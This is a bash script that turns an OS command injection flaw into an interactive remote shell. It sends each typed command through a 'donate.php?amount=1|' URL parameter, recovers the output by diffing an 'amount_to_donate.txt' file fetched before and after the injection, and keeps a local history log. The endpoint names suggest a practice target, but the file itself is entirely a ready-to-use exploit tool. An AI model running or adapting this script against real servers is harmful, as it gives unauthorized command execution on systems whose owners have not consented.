#!/bin/bash

read -rp 'Host :' host
read -rp 'Port :' port

LOG_FILE="${HOME}/command-history.log"

while true; do
	read -rp '$ ' raw_command

	# Check if user wants to display command history, clear history, or exit.
	case "${raw_command}" in
		history)
			cat "${LOG_FILE}" 2>/dev/null || echo "No history yet."
			continue
			;;
		clear-history)
			: > "${LOG_FILE}"
			echo "History cleared."
			continue
			;;
		exit|quit)
			break
			;;
		"")
			continue
			;;
	esac

	command=$(printf %s "${raw_command}" | jq -sRr @uri)

	# Store the previous list of command outputs.
	prev_resp=$(curl -s "http://${host}:${port}/amount_to_donate.txt")

	# Execute the OS Command Injection vulnerability.
	curl -s -o /dev/null "http://${host}:${port}/donate.php?amount=1|${command}"

	# Store the new list of command outputs.
	new_resp=$(curl -s "http://${host}:${port}/amount_to_donate.txt")

	# Extract only the difference between the two command outputs.
	delta=$(diff --new-line-format="%L" --unchanged-line-format="" <(echo "${prev_resp}") <(echo "${new_resp}"))

	# Output the command result.
	echo "${delta}"

	# Write log entry to command/response history file.
	{
		echo "=========="
		echo "Time: $(date '+%Y-%m-%d %H:%M:%S %z')"
		echo "Command: ${raw_command}"
		echo "Response:"
		echo "${delta}"
		echo
	} >> "${LOG_FILE}"
done
